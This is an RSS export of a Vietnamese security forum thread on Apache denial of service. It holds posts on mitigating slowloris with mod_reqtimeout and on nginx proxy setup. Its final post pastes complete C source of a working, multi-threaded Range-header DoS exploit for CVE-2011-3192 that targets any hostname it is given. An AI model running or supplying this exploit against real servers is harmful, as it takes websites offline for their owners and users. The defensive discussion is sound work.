+		<blockquote>Loay hoay mãi vẩn chưa run được, đuối.....Có bác nào giúp e trải nghiệm với, vì  em không rành về Perl. Thanks!&nbsp;
+		</blockquote>
+
+Bồ muốn "trải nghiệm" cái gì? Không rành về Perl thì học Perl, thực hành Perl. Sách về Perl có một tỉ cuốn trên mạng kìa. Những cái này không có ai có thể giúp được cả.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210589</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210589</link>
+				<pubDate><![CDATA[Sun, 9 May 2010 18:09:02]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Phiên bản apache httpd 2.2.15 (trở đi) có thêm module mod_reqtimeout hiện đang ở tình trạng "experimental". Module này cho phép ấn định giá trị "timeout" của request. Có hai phần chính trong directive <b>RequestReadTimeout</b> đó là timeout cho "body" và timeout cho "header". Đối với slowloris, giá trị timeout cho "header" chính là biện pháp chống chọi với dạng DDoS được thảo luận ở trên. Nó tương tự với giá trị <b>client_header_timeout</b> của nginx. Tuy nhiên, xét về mặt kỹ thuật thì <b>RequestReadTimeout</b> của apache hay hơn <b>client_header_timeout</b> của nginx ở chỗ nó có thêm giá trị "MinRate" đi kèm. Giá tri "MinRate" này là một phương tiện để ấn định khả năng gia giảm giá trị "timeout" dynamically. Bởi vậy, nó uyển chuyển hơn <b>client_header_timeout</b> của nginx.
+
+Ví dụ:
+
+<b>RequestReadTimeout header=<font color='orange'>5</font>-<font color='green'>10</font>,MinRate=<font color='red'>500</font></b>
+
+Dòng ấn định trên có nghĩa nôm na là một request đi vô sẽ được httpd apache chờ đợi thông tin của request header (chỉ header chớ không bao gồm luôn body) là <b><font color='orange'>5</font> giây</b>. Nếu phía client gởi data cho phần header thì cứ mỗi <b><font color='red'>500</font> bytes</b> mà httpd apache nhận được, nó sẽ gia tăng timeout thêm 1 giây. Nhưng nếu sau <font color='green'>10</font> giây mà không có thêm thông tin gì cho header nữa thì apache httpd sẽ huỷ connection của client đó. Tính uyển chuyển nằm ở chỗ nếu phía client có thật sự gởi data thì gia tăng giá trị "timeout" để tạo điều kiện cho client ấy tiếp tục gởi. Tuy nhiên, apache vẫn ấn định thời gian tối đa để gởi một http header là <font color='green'>10</font> giây.
+
+Trong tình trạng bị slowloris tấn công, <b>RequestReadTimeout</b> giúp triệt tiêu các connections mà slowloris tạo ra trong một khoảng thời gian được ấn định cụ thể thay vì bị tràn ngập hết "MaxClients" và hoàn toàn không thể tiếp tục phục vụ.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210590</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210590</link>
+				<pubDate><![CDATA[Sun, 9 May 2010 18:50:15]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">xxxxx.kenji.xxxxx wrote:</cite><br>
+		<blockquote>Loay hoay mãi vẩn chưa run được, đuối.....Có bác nào giúp e trải nghiệm với, vì  em không rành về Perl. Thanks!&nbsp;
+		</blockquote>
+
+Bồ muốn "trải nghiệm" cái gì? Không rành về Perl thì học Perl, thực hành Perl. Sách về Perl có một tỉ cuốn trên mạng kìa. Những cái này không có ai có thể giúp được cả.&nbsp;
+		</blockquote>
+
+
+Đã run, thanks!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210682</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210682</link>
+				<pubDate><![CDATA[Tue, 11 May 2010 00:03:10]]> GMT</pubDate>
+				<author><![CDATA[ xxxxx.kenji.xxxxx]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Hi, giúp em vấn đề này với.
+
+Em đã setup nginx và chạy thành công nhưng bị lỗi này.
+
+File config em như sau:
+-nginx listen ở port 80
+-apache listen ở port 8000
+-forum em chạy vbb
+Em vẫn chạy forum được với path http://site/forum/index.php nhưng có những script ví dụ như login, newpost nó lại bị wwwect về http://site:8000/forum/xxx.php? thế là ko thể connect được, muốn connect thì phải bỏ :8000 ở path, em muốn hỏi là làm sao để khắc phục tình trạng này?
+
+Thân.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216191</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216191</link>
+				<pubDate><![CDATA[Fri, 23 Jul 2010 13:16:29]]> GMT</pubDate>
+				<author><![CDATA[ Monkey.D.Luffy]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Hê hê, em fix được rồi mấy pác :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216192</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216192</link>
+				<pubDate><![CDATA[Fri, 23 Jul 2010 15:20:50]]> GMT</pubDate>
+				<author><![CDATA[ Monkey.D.Luffy]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Bây giờ thì em lại có vấn đề với cache.
+Em đã config lưu cache thành công đối với file image,css,js nhưng đối với script thì nó vẫn lưu lại cache nên mỗi lần post bài thì phải F5 mới hiển thị được bài viết.
+
+Làm sao ko cho script *.php ko lưu lại cache mấy anh? Em đang sử dụng nginx 7.x nên ko có option proxy_no_cache, giờ chẳng biết làm sao, ai help em với ạ :(
+
+Thân.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216233</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#216233</link>
+				<pubDate><![CDATA[Sat, 24 Jul 2010 09:13:07]]> GMT</pubDate>
+				<author><![CDATA[ Monkey.D.Luffy]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ - Nếu xài chung 1 proxy thì thằng proxy sẽ lảnh đạn trước rồi mới tới mình, 
+Chắc chắn Proxy sẽ tự bảo vệ, điều đó cũng có nghĩa proxy là tấm đỡ cho mình 1 phần,
+Đứa nào qua được proxy thì mình đập đầu từng đứa 1  :-) 
+- Còn nếu dùng proy cá nhân thì chỉ cần đập 1 cái chết liền đỡ mỏi tay hơn ở trên  =)) .
+
+Em là nêu bai, lời em nói chỉ lai rai, có gì sai xin giả nai, đừng cho bái bai, kẻo em die.  :*- ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#217196</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#217196</link>
+				<pubDate><![CDATA[Sun, 1 Aug 2010 09:02:08]]> GMT</pubDate>
+				<author><![CDATA[ huyannet]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">huyannet wrote:</cite><br>
+		<blockquote>- Nếu xài chung 1 proxy thì thằng proxy sẽ lảnh đạn trước rồi mới tới mình, 
+Chắc chắn Proxy sẽ tự bảo vệ, điều đó cũng có nghĩa proxy là tấm đỡ cho mình 1 phần,
+Đứa nào qua được proxy thì mình đập đầu từng đứa 1  :-) 
+- Còn nếu dùng proy cá nhân thì chỉ cần đập 1 cái chết liền đỡ mỏi tay hơn ở trên  =)) .
+
+Em là nêu bai, lời em nói chỉ lai rai, có gì sai xin giả nai, đừng cho bái bai, kẻo em die.  :*- &nbsp;
+		</blockquote>
+
+Hiểu rõ vấn đề rồi hãy có ý kiến. Đừng đọc lướt rồi hiểu sai dẫn đến chỗ phát biểu trật lất hết.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#217256</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#217256</link>
+				<pubDate><![CDATA[Sun, 1 Aug 2010 23:08:11]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Monkey.D.Luffy wrote:</cite><br>
+		<blockquote>Hi, giúp em vấn đề này với.
+
+Em đã setup nginx và chạy thành công nhưng bị lỗi này.
+
+File config em như sau:
+-nginx listen ở port 80
+-apache listen ở port 8000
+-forum em chạy vbb
+Em vẫn chạy forum được với path<span class="link"> http://site/forum/index.php</span> nhưng có những script ví dụ như login, newpost nó lại bị wwwect về<span class="link"> http://site:8000/forum/xxx.php?</span> thế là ko thể connect được, muốn connect thì phải bỏ :8000 ở path, em muốn hỏi là làm sao để khắc phục tình trạng này?
+
+Thân.
+&nbsp;
+		</blockquote>
+Bạn có thể giải thích rõ chổ này giúp mình được không?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#224401</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#224401</link>
+				<pubDate><![CDATA[Sat, 6 Nov 2010 21:34:22]]> GMT</pubDate>
+				<author><![CDATA[ LlyKil]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Monkey.D.Luffy wrote:</cite><br>
+		<blockquote>Bây giờ thì em lại có vấn đề với cache.
+Em đã config lưu cache thành công đối với file image,css,js nhưng đối với script thì nó vẫn lưu lại cache nên mỗi lần post bài thì phải F5 mới hiển thị được bài viết.
+
+Làm sao ko cho script *.php ko lưu lại cache mấy anh? Em đang sử dụng nginx 7.x nên ko có option proxy_no_cache, giờ chẳng biết làm sao, ai help em với ạ :(
+
+Thân.&nbsp;
+		</blockquote>
+
+Bạn gửi nội dung file nginx config lên đây thì mọi người mới có thể giúp được :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#225592</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#225592</link>
+				<pubDate><![CDATA[Fri, 26 Nov 2010 05:48:13]]> GMT</pubDate>
+				<author><![CDATA[ lequi]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Quyết liệt quá, nhìn mà ghiền, ước gì mình hiểu tất cả, chỉ hiểu 30%]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#227508</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#227508</link>
+				<pubDate><![CDATA[Mon, 20 Dec 2010 20:36:29]]> GMT</pubDate>
+				<author><![CDATA[ theghoststone]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ =.=! Cái này có gì hot ! nếu thiết lập request timeout hợp lý là ổn rồi. Ai biểu keep-alive làm chi.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#247539</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#247539</link>
+				<pubDate><![CDATA[Wed, 21 Sep 2011 07:58:28]]> GMT</pubDate>
+				<author><![CDATA[ chiro8x]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>Phiên bản apache httpd 2.2.15 (trở đi) có thêm module mod_reqtimeout hiện đang ở tình trạng "experimental". Module này cho phép ấn định giá trị "timeout" của request. Có hai phần chính trong directive <b>RequestReadTimeout</b> đó là timeout cho "body" và timeout cho "header". Đối với slowloris, giá trị timeout cho "header" chính là biện pháp chống chọi với dạng DDoS được thảo luận ở trên. Nó tương tự với giá trị <b>client_header_timeout</b> của nginx. Tuy nhiên, xét về mặt kỹ thuật thì <b>RequestReadTimeout</b> của apache hay hơn <b>client_header_timeout</b> của nginx ở chỗ nó có thêm giá trị "MinRate" đi kèm. Giá tri "MinRate" này là một phương tiện để ấn định khả năng gia giảm giá trị "timeout" dynamically. Bởi vậy, nó uyển chuyển hơn <b>client_header_timeout</b> của nginx.
+
+Ví dụ:
+
+<b>RequestReadTimeout header=<font color='orange'>5</font>-<font color='green'>10</font>,MinRate=<font color='red'>500</font></b>
+
+Dòng ấn định trên có nghĩa nôm na là một request đi vô sẽ được httpd apache chờ đợi thông tin của request header (chỉ header chớ không bao gồm luôn body) là <b><font color='orange'>5</font> giây</b>. Nếu phía client gởi data cho phần header thì cứ mỗi <b><font color='red'>500</font> bytes</b> mà httpd apache nhận được, nó sẽ gia tăng timeout thêm 1 giây. Nhưng nếu sau <font color='green'>10</font> giây mà không có thêm thông tin gì cho header nữa thì apache httpd sẽ huỷ connection của client đó. Tính uyển chuyển nằm ở chỗ nếu phía client có thật sự gởi data thì gia tăng giá trị "timeout" để tạo điều kiện cho client ấy tiếp tục gởi. Tuy nhiên, apache vẫn ấn định thời gian tối đa để gởi một http header là <font color='green'>10</font> giây.
+
+Trong tình trạng bị slowloris tấn công, <b>RequestReadTimeout</b> giúp triệt tiêu các connections mà slowloris tạo ra trong một khoảng thời gian được ấn định cụ thể thay vì bị tràn ngập hết "MaxClients" và hoàn toàn không thể tiếp tục phục vụ.&nbsp;
+		</blockquote>
+
+Bài của anh conmale quá chuẩn luôn :(. Lúc nãy em đọc không kĩ. Thực ra slowris không có gì quá ghê gớm cả. Slowris lợi dụng việc Apache nhầm lẫn giữa \r\n\r\n và \r\n khiến cho nó không thể kết thúc truy vấn được.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#247540</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#247540</link>
+				<pubDate><![CDATA[Wed, 21 Sep 2011 08:01:25]]> GMT</pubDate>
+				<author><![CDATA[ chiro8x]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ 1 code dos vào Apache  mới trên exploit-db.com
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+ * This is a reverse engineered version of the exploit for CVE-2011-3192 made
+ * by ev1lut10n &#40;http://jayakonstruksi.com/backupintsec/rapache.tgz&#41;.
+ * Copyright 2011 Ramon de C Valle &lt;rcvalle@redhat.com&gt;
+ *
+ * Compile with the following command:
+ * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c
+ */
+ 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+ 
+void ptrace_trap&#40;void&#41; __attribute__ &#40;&#40;constructor&#41;&#41;;
+ 
+void
+ptrace_trap&#40;void&#41; {
+    if &#40;ptrace&#40;PTRACE_TRACEME, 0, 0, 0&#41; &lt; 0&#41; {
+        write&#40;fileno&#40;stdout&#41;, &quot;Segmentation fault\n&quot;, 19&#41;;
+        exit&#40;-1&#41;;
+    }
+}
+ 
+void
+w4rn41dun14mu&#40;int attr, int fg, int bg&#41;
+{
+    char command&#91;13&#93;;
+ 
+    sprintf&#40;command, &quot;%c&#91;%d;%d;%dm&quot;, 0x1b, attr, fg+30, bg+40&#41;;
+    printf&#40;&quot;%s&quot;, command&#41;;
+}
+ 
+void
+banner&#40;&#41;
+{
+    w4rn41dun14mu&#40;0, 1, 0&#41;;
+    fwrite&#40;&quot;Remote Apache Denial of Service Exploit by ev1lut10n\n&quot;, 53, 1,
+           stdout&#41;;
+}
+ 
+void
+gime_er_mas&#40;&#41;
+{
+    printf&#40;&quot;%c%s&quot;, 0x1b, &quot;&#91;2J&quot;&#41;;
+    printf&#40;&quot;%c%s&quot;, 0x1b, &quot;&#91;1;1H&quot;&#41;;
+    puts&#40;&quot;\nsorry dude there's an error...&quot;&#41;;
+}
+ 
+struct thread_info {
+    pthread_t thread_id;
+    int       thread_num;
+    char     *argv_string;
+};
+ 
+static void *
+thread_start&#40;void *arg&#41;
+{
+    struct thread_info *tinfo = &#40;struct thread_info *&#41; arg;
+    char hostname&#91;64&#93;;
+    int j;
+ 
+    strcpy&#40;hostname, tinfo-&gt;argv_string&#41;;
+ 
+    j = 0;
+    while &#40;j != 10&#41; {
+        struct addrinfo hints;
+        struct addrinfo *result, *rp;
+        int sfd, s;
+        ssize_t nwritten;
+ 
+        memset&#40;&hints, 0, sizeof&#40;struct addrinfo&#41;&#41;;
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_flags = 0;
+        hints.ai_protocol = 0;
+ 
+        s = getaddrinfo&#40;hostname, &quot;http&quot;, &hints, &result&#41;;
+        if &#40;s != 0&#41; {
+            fprintf&#40;stderr, &quot;getaddrinfo: %s\n&quot;, gai_strerror&#40;s&#41;&#41;;
+            exit&#40;EXIT_FAILURE&#41;;
+        }
+ 
+        for &#40;rp = result; rp != NULL; rp = rp-&gt;ai_next&#41; {
+            sfd = socket&#40;rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol&#41;;
+            if &#40;sfd == -1&#41;
+                continue;
+ 
+            if &#40;connect&#40;sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen&#41; == -1&#41;
+                close&#40;sfd&#41;;
+        }
+ 
+        if &#40;result != NULL&#41;
+            freeaddrinfo&#40;result&#41;;
+ 
+        nwritten = write&#40;sfd, &quot;HEAD / HTTP/1.1\n&quot;
+                              &quot;Host:localhost\n&quot;
+                              &quot;Range:bytes=0-,0-\n&quot;
+                              &quot;Accept-Encoding: gzip&quot;, 71&#41;;
+        if &#40;nwritten == -1&#41;
+            close&#40;sfd&#41;;
+ 
+        usleep&#40;300000&#41;;
+ 
+        j++;
+    }
+ 
+    return 0;
+}
+ 
+int
+main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+    int i;
+    struct thread_info tinfo;
+ 
+    banner&#40;&#41;;
+ 
+    if &#40;argc &lt;= 1&#41; {
+        w4rn41dun14mu&#40;0, 2, 0&#41;;
+        fwrite&#40;&quot;\n&#91;-&#93; Usage : ./rapache hostname\n&quot;, 32, 1, stdout&#41;;
+        return 0;
+    }
+ 
+    w4rn41dun14mu&#40;0, 3, 0&#41;;
+    printf&#40;&quot;&#91;+&#93; Attacking %s please wait  in minutes ...\n&quot;, argv&#91;1&#93;&#41;;
+ 
+    while &#40;1&#41; {
+        i = 0;
+        while &#40;i != 50&#41; {
+            tinfo.thread_num = i;
+            tinfo.argv_string = argv&#91;1&#93;;
+ 
+            pthread_create&#40;&tinfo.thread_id, NULL, &thread_start, &tinfo&#41;;
+ 
+            usleep&#40;500000&#41;;
+ 
+            i++;
+        }
+    }
+}</pre>
+		</div>
+<span class="link"> http://www.exploit-db.com/exploits/18225/</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#250961</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#250961</link>
+				<pubDate><![CDATA[Sat, 10 Dec 2011 09:13:24]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+	</channel>
+</rss>
